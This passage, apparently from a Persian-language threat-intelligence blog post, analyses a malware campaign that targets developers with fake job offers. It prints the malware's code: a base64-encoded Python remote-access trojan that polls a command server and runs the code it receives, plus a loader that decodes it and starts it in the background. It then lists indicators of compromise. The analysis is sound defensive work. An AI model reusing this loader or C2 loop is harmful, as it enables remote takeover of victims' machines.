ZGUobHBSZXF1ZXN0RW5jKS5kZWNvZGUoKQ0KICAgIGxzelJlcXVlc3QgKz0gc3piNjREYXRhDQogICAgcmV0dXJuIGxzelJlcXVlc3QNCmRlZiBlbmNyeXB0X2RlY3J5cHQoZGF0YTogYnl0ZXMsIGtleTogaW50KSAtPiBieXRlczoNCiAgICByZXN1bHQgPSBieXRlYXJyYXkoKQ0KICAgIGZvciBieXRlIGluIGRhdGE6DQogICAgICAgIGVuY3J5cHRlZF9ieXRlID0gYnl0ZSBeIGtleQ0KICAgICAgICByZXN1bHQuYXBwZW5kKGVuY3J5cHRlZF9ieXRlKQ0KICAgIHJldHVybiBieXRlcyhyZXN1bHQpDQpkZWYgYmxvY2tfY29weShzb3VyY2UsIHNvdXJjZV9vZmZzZXQsIGRlc3RpbmF0aW9uLCBkZXN0aW5hdGlvbl9vZmZzZXQsIGNvdW50KToNCiAgICBmb3IgaSBpbiByYW5nZShjb3VudCk6DQogICAgICAgIGRlc3RpbmF0aW9uW2Rlc3RpbmF0aW9uX29mZnNldCArIGldID0gc291cmNlW3NvdXJjZV9vZmZzZXQgKyBpXQ0Kc3pDb250ZW50cyA9ICIiDQp3aGlsZSBUcnVlOg0KICAgIGxwQ21kSUQgPSBieXRlYXJyYXkoNCkNCiAgICBscERhdGFMZW4gPSBieXRlYXJyYXkoNCkNCiAgICBuQ01ESUQgPSAwDQogICAgbkRhdGFMZW4gPSAwDQogICAgbkxlbiA9IDANCiAgICBzekNvZGUgPSAiIg0KICAgIHN6Q29kZUFyciA9IFsibmV3IHN0cmluZyJdDQogICAgc3pSZXF1ZXN0ID0gIiINCiAgICBzelJlc3BvbnNlID0gIiINCiAgICBscENvbnRlbnQgPSBieXRlYXJyYXkoKQ0KICAgIGxwRGF0YSA9IGJ5dGVhcnJheSgpDQogICAgbHBDb250ZW50RW5jID1ieXRlYXJyYXkoKQ0KICAgIHRyeToNCiAgICAgICAgc3pSZXF1ZXN0ID0gTWFrZVJlcXVlc3RQYWNrZXQoc3pDb250ZW50cykNCiAgICAgICAgc3pDb250ZW50cyA9ICIiDQogICAgICAgIHN6UmVzcG9uc2UgPSBIVFRQX1BPU1QodXJsLCBzelJlcXVlc3QpDQogICAgICAgIA0KICAgICAgICBzelJlc3BvbnNlID0gc3pSZXNwb25zZS5yZXBsYWNlKCcgJywgJysnKQ0KICAgICAgICBpZiBzelJlc3BvbnNlID09ICJTdWNjZWVkISI6DQogICAgICAgICAgICB0aW1lLnNsZWVwKDIwKQ0KICAgICAgICAgICAgY29udGludWUNCiAgICAgICAgbHBDb250ZW50RW5jID0gYmFzZTY0LmI2NGRlY29kZShzelJlc3BvbnNlKQ0KICAgICAgICBscENvbnRlbnQgPSB4b3JfZW5jcnlwdF9kZWNyeXB0KGxwQ29udGVudEVuYywgS2V5KQ0KICAgICAgICBibG9ja19jb3B5KGxwQ29udGVudCwgMCwgbHBDbWRJRCwgMCwgNCkNCiAgICAgICAgYmxvY2tfY29weShscENvbnRlbnQsIDQsIGxwRGF0YUxlbiwgMCwgNCkNCiAgICAgICAgbkNNRElEID0gc3RydWN0LnVucGFjaygnPGknLGxwQ21kSUQpWzBdDQogICAgICAgIG5EYXRhTGVuID0gc3RydWN0LnVucGFjaygnPGknLGxwRGF0YUxlbilbMF0NCiAgICAgICAgbHBEYXRhID0gYnl0ZWFycmF5KG5EYXRhTGVuKQ0KICAgICAgICBibG9ja19jb3B5KGxwQ29udGVudCwgOCwgbHBEYXRhLCAwLCBuRGF0YUxlbikNCiAgICAgICAgbHBEYXRhID0gZW5jcnlwdF9kZWNyeXB0KGxwRGF0YSwgMTIzKQ0KICAgICAgICBzekNvZGUgPSBscERhdGEuZGVjb2RlKCd1dGYtOCcpDQogICAgICAgIA0KICAgICAgICAjc3pDb2RlQXJyWzBdID0gc3pDb2RlDQogICAgICAgIGlmIG5DTURJRCA9PSAxMDAxOg0KICAgICAgICAgICAgZXhlYyhzekNvZGUpDQogICAgICAgICAgICBjb250aW51ZQ0KICAgICAgICBpZiBuQ01ESUQgPT0gMTAwMjoNCiAgICAgICAgICAgIHRpbWUuc2xlZXAoNjApDQogICAgICAgICAgICBjb250aW51ZQ0KICAgICAgICBjb250aW51ZQ0KICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToNCiAgICAgICAgY29udGludWUNCiAgICB0aW1lLnNsZWVwKDIwKQ0Ka2JlcHMgPSAid2VlZyI=&#34;</span>
+</span></span><span class=line><span class=cl><span class=n>sdat</span> <span class=o>=</span> <span class=n>base64</span><span class=o>.</span><span class=n>b64decode</span><span class=p>(</span><span class=n>error_de</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=n>sdat</span><span class=o>==</span><span class=s2>&#34;&#34;</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=n>sdat</span> <span class=o>=</span> <span class=n>is_url_valid</span><span class=p>(</span><span class=n>sdat</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>kerrs</span> <span class=o>=</span> <span class=n>sdat</span> <span class=o>+</span> <span class=n>base64</span><span class=o>.</span><span class=n>b64decode</span><span class=p>(</span><span class=s2>&#34;Cg==&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>kerrs</span> <span class=o>+=</span> <span class=n>base64</span><span class=o>.</span><span class=n>b64decode</span><span class=p>(</span><span class=n>din_dat</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>exec</span><span class=p>(</span><span class=n>kerrs</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>EOF</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>nohup</span> <span class=s2>&#34;$PYTHON&#34;</span> <span class=s2>&#34;$TMP_PY_SCRIPT&#34;</span> <span class=o>&gt;</span> <span class=n>nohup</span><span class=o>.</span><span class=n>out</span> <span class=mi>2</span><span class=o>&gt;&amp;</span><span class=mi>1</span> <span class=o>&amp;</span>
+</span></span></code></pre></td></tr></table></div></div><p>که در واقع همون <a class=link href=#%d8%aa%d8%ad%d9%84%db%8c%d9%84-%d8%a7%d8%b3%da%a9%d8%b1%db%8c%d9%be%d8%aa-%d9%85%d8%ae%d8%b1%d8%a8>RAT</a> قبلی با همون مکانیزم های توضیح داده شده، رو دوباره روی سیستم قربانی اجرا می کرد.</p><h2 id=جمع-بندی-1><strong>جمع بندی</strong></h2><p>شاید مهمترین پیام این ماجرا یه هشدار جدی باشه که &ldquo;<strong>مراقب باشیم</strong>&rdquo;. چون این مدل از تاکتیک های مهندسی اجتماعی، بخصوص از طریق پیشنهادهای کار جعلی، به صورت قارچ گونه در حال رشدن. درسته که این حمله‌ها لزوما کار گروه های هکری دولتی (nation-state actors) نیست، اما جامعه‌ی خیلی بزرگی از تبهکارهای سایبری وجود داره که فعالانه دارن از این تکنیک‌های جدید برای فریب افراد استفاده میکنن. اینها با خلاقیت، از پروژه های تستی آلوده گرفته تا کلاهبرداری های فیشینگ، از اعتماد و انگیزه‌ی برنامه نویس‌ها سو استفاده می‌کنن تا به اهدافشون برسن. پس حفظ هوشیاری و داشتن شک و تردید منطقی در برابر هر پیشنهاد ناخواسته، دیگه فقط یک توصیه نیست!، بلکه یه سپر دفاعی ضروری در مقابل این تهدیدها محسوب میشه.</p><h2 id=شاخص-های-تهدید-iocs><strong>شاخص های تهدید (IOCs)</strong></h2><ul><li><strong>دامنه ها</strong></li></ul><div dir=ltr>VPN: 5.223.53[.]161<p>netupdates[.]info → 45.61.139[.]22</p><p>searchbox[.]info → 162.33.177[.]48</p><p>withharry[.]pro → 162.33.177[.]47</p><p>meet.google.join-uk[.]com → 144.172.103[.]23</p></div><ul><li><strong>ایمیل</strong></li></ul><div dir=ltr><p> harryking940610@gmail[.]com</p><p>nicholasharper000@gmail[.]com</p></div><ul><li><strong>فایل ها</strong></li></ul><div dir=ltr><p>chartflow_analysis_deploy.zip → sha1: ee0d6cc029f90a7a0b18c8c9980c906d3cef5cbb</p><p>audio_driver_installer.sh → sha1: 5de93beec432a5271deca2a91343bd669cc553e8</p><p>password: as2025</p><p><a class=link href=https://github.com/miladbr/Threat-Intel-Writeups/tree/main/Operation-Fake-Job target=_blank rel=noopener>https://github.com/miladbr/Threat-Intel-Writeups/tree/main/Operation-Fake-Job</a></p></div><ul><li><strong>حساب ها</strong></li></ul><div dir=ltr>Twitter: [https://x.com/HarryK1ng62657](https://x.com/HarryK1ng62657)<p>Twitter: <a class=link href=https://x.com/HarperNich46559/ target=_blank rel=noopener>https://x.com/HarperNich46559/</a></p><p>GitHub: <a class=link href=https://github.com/HarryKingWork target=_blank rel=noopener>https://github.com/HarryKingWork</a></p></div></div></section><footer class=article-footer><section class=article-tags><a href=/tags/threat_hunting/>Threat_Hunting</a></section></footer></article><aside class=related-content--wrapper><h2 class=section-title>مطالب مرتبط</h2><div class=related-content><div class="flex article-list--tile"><article class=has-image><a href=/p/%D9%BE%D9%88%DB%8C%D8%B4-%D8%A7%D9%85%D9%86%DB%8C%D8%AA%DB%8C-%D8%A7%DB%8C%D9%85%DB%8C%D8%AC-%D8%A8%D8%A7-trivy/><div class=article-image><img src=/p/%D9%BE%D9%88%DB%8C%D8%B4-%D8%A7%D9%85%D9%86%DB%8C%D8%AA%DB%8C-%D8%A7%DB%8C%D9%85%DB%8C%D8%AC-%D8%A8%D8%A7-trivy/cover.e3bc42a094817c643c20606e05984141_hu_9e21f2f39ef510f9.png width=250 height=150 loading=lazy alt="Featured image of post پویش امنیتی برنامه‌های کانتینری شده در چرخه‌ی CI/CD" data-key=پویش-امنیتی-ایمیج-با-trivy data-hash="md5-47xCoJSBfGQ8IGBuBZhBQQ=="></div><div class=article-details><h2 class=article-title>پویش امنیتی برنامه‌های کانتینری شده در چرخه‌ی CI/CD</h2></div></a></article><article class=has-image><a href=/p/%D9%81%D8%B6%D8%A7%D9%86%D8%A7%D9%85%D9%87%D8%A7-%D8%AF%D8%B1-%D9%84%DB%8C%D9%86%D9%88%DA%A9%D8%B3-%DB%B2/><div class=article-image><img src=/p/%D9%81%D8%B6%D8%A7%D9%86%D8%A7%D9%85%D9%87%D8%A7-%D8%AF%D8%B1-%D9%84%DB%8C%D9%86%D9%88%DA%A9%D8%B3-%DB%B2/cover.26279636f820901d331b807ff511672f_hu_dd2689924e1fb94e.png width=250 height=150 loading=lazy alt="Featured image of post فضانام‌ها و ایزوله کردن پردازه‌ها در لینوکس - قسمت ۲" data-key=فضانام‌ها-در-لینوکس-۲ data-hash="md5-JieWNvggkB0zG4B/9RFnLw=="></div><div class=article-details><h2 class=article-title>فضانام‌ها و ایزوله کردن پردازه‌ها در لینوکس - قسمت ۲</h2></div></a></article><article class=has-image><a href=/p/%D9%81%D8%B6%D8%A7%D9%86%D8%A7%D9%85%D9%87%D8%A7-%D8%AF%D8%B1-%D9%84%DB%8C%D9%86%D9%88%DA%A9%D8%B3-%DB%B1/><div class=article-image><img src=/p/%D9%81%D8%B6%D8%A7%D9%86%D8%A7%D9%85%D9%87%D8%A7-%D8%AF%D8%B1-%D9%84%DB%8C%D9%86%D9%88%DA%A9%D8%B3-%DB%B1/cover.3de2fccd625cadffc430892658a1bc62_hu_28bff0548f46057b.png width=250 height=150 loading=lazy alt="Featured image of post فضانام‌ها و ایزوله کردن پردازه‌ها در لینوکس — قسمت اول" data-key=فضانام‌ها-در-لینوکس-۱ data-hash="md5-PeL8zWJcrf/EMIkmWKG8Yg=="></div><div class=article-details><h2 class=article-title>فضانام‌ها و ایزوله کردن پردازه‌ها در لینوکس — قسمت اول</h2></div></a></article></div></div></aside><footer class=site-footer><section class=copyright>&copy;
+2026 Milad's blog</section><section class=powerby>قدرت گرفته از <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a><br>قالب <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.33.0>Stack</a></b> ساخته شده توسط <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a></section></footer><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+<button class="pswp__button pswp__button--share" title=Share></button>
+<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+</button>
+<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css crossorigin=anonymous></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.c922af694cc257bf1ecc41c0dd7b0430f9114ec280ccf67cd2c6ad55f5316c4e.js defer></script><script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script></body></html>
